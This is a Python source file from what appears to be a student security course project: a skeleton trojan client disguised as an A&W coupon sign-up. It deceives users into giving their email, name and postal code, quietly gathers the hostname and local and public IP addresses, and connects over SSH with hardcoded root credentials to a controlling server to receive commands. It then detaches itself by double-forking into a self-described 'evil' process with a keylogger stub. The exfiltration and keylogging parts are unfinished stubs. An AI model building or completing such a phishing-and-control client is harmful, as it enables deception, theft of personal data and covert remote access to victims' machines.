# test_client.py

#==============================================================================
 #   Assignment:  Major Project - Tunelling Milestone 1
 #
 #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
 #     Language:  Python 3
 #                      
 #   To Compile: Paramiko must be available 
 #
 #    Class:  DPI912 
 #    Professor:  Harvey Kaduri
 #    Due Date:  Mar 24th 2020 
 #    Submitted: Mar 22nd 2020
 #
 #-----------------------------------------------------------------------------
 #
 #  Description: This program is a skeleton client that connects to an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
 #      
 #        Input:  N/A
 #
 #       Output:  Outputs to console results of command executed
 #
 #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Continously request new commands and then send them to the target client. Await for 
 #               
 #             
 #   Required Features Not Included: N/A
 #
 #   Known Bugs:  N/A 
 #      
 #
 #   Classification: N/A
 #
#==============================================================================
import paramiko
import sys
import os
import re
import socket #to capture the local IP
import urllib.request # to capture the public ip
import logzero
from logzero import logger


logzero.logfile("clientLogger.log", maxBytes=1e6, backupCount=2)
def fetchSFTP(keyLoc):
    '''
    This function handles the connection and creation of SSH and SFTP connections to a target server.
    When an exception occurs, disconnect from the server if possible.
    @returns - SFTP - A connected SFTP object 
    '''
    try:
        sftp = 0
        client = 0
        host = "::1"
        port = 9500
        usr,  pwd = 'root', 'toor'
        
        key = paramiko.RSAKey(filename=keyLoc)

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host,port, usr, pwd,  key)
        
        chan = client.get_transport().open_session()

        chan.send('Hello, I am a nice client :)')
        command = chan.recv(1024)
        command = command.decode()
        print("Executing this -->" + str(command))
        
      
        return chan
    except Exception as e:
        print("We ran into a problem and have to close. Please try again later.")
        print("Unhandled exception ->"+ str(e))
        
        if sftp != 0:
            sftp.close()
        if client != 0:
            client.close()
        sys.exit(0)
    
    #--------------End of fetch SFTP-----------#

def getInput():
    '''
    This function handles the input and validation of the program. 
    It also collects some secondary information related to an IP address.
    @returns - array - The array of voluntarily given information
    '''

    infoBank = list()
    detail = 0
    regexEmail = '^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$' # server should expect validated email

    print("Welcome to A&W Free Root Beer & Coupouns Promotion! \n")
    print("At A & W, we pride ourselves on getting to know our customers.\n By giving us your email, we promise to send you only the best deals straight from our hearts to yours.")
    while(detail == 0):
        email = input("Please enter an email to begin: ")         

        while not re.match(regexEmail, email): #validate an email
            email = input("That email doesnt look right. Try Again:")    
            
        print("Thanks! We only need your email, but for local offers we need more info. Enter more information?")
        
        while (detail != "Y") and (detail != "N"):
            detail = input("Y/N: ")
        
        if detail == "Y":
            firstName = input("Enter your first name: ")
            lastName = input("Enter your last name: ")
            postalCode = input("Enter your postal code for local offers: ")
            
        else:
            firstName = "Friendly"
            lastName = "User"
            postalCode = "K7P 1A3"

        name, local, public = getIPaddr() # could be flagged as suspicious traffic to ident.me ? 
        userInfo = [email,firstName,lastName,postalCode, name,local,public]
            
        print("Thank you! You are now signed up for free rewards. \
        \nWould you like to sign up another user?")
        detail = 0
        while (detail != "Y") and (detail != "N"):
            detail = input("Y/N: ")
        if detail == "Y":
            detail = 0

        infoBank.append(userInfo)
    
    print("Please visit http://www.awcoupon.ca/en and login using the email you provided and password of 'P@ssw0rd'")
    print("From our family to yours, thank you for choosing A&W. Goodbye!")
    return infoBank
     #---------------End of GetInput-----------------#

def getIPaddr():
    '''
    This function handles the capture of the user's private IP address, hostname, and public IP
    @returns - host, ip, external_ip
    '''
    print("One Moment please while we sign you up...")
    ip = 0
    host = socket.gethostname()    
    ip = socket.gethostbyname(host)    
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')

    return host, ip, external_ip    

def keylog():
    #while True:
    
    #your code here
    
    return 0
    
def sendFile(dataFile,  conn, filename):
    
    if filename == 'infobank.txt':
        print(filename)
    
    elif filename == 'keylog.txt':
        print(filename)
    else:
        logger.error("Unknown fille handle sent to sendFile")
    
    return 0
def run():
    keyLoc = os.getcwd()
    keyLoc += '/test_rsa.key'
    
    sftp = fetchSFTP(keyLoc)
    infoBank = getInput()
    sendFile(infoBank,  sftp,  'infobank.txt')
    sftp.close()
    
    #child forks to be evil
    try:
        if os.fork() > 0:
            sys.exit(0)
    except OSError as e:
        logger.error("Unable to fork for fork #1")
        sftp.close()
        sys.exit(0)
                
    os.chdir('/')
    try:
        os.setsid()
    except Exception as e:
        logger.warning("Could not change the GID and/or UID - is this process privilaged?")
        logger.warning(str(e))
            
        # End Leadership by double forking
    try:
        if os.fork() > 0:
            raise os._exit(0)
    except OSError as e:
        logger.error("Unable to fork for fork #2")
        
    #I am the child connection, I am an evil fork and shouldn't HUP
    keylog()
    stfp2 = fetchSFTP(keyLoc)

    sendFile(infoBank,  sftp,  'infobank.txt')
    stfp2.close()
    os._exit(0)
    
# MAIN # 
if __name__ == '__main__':
    run()


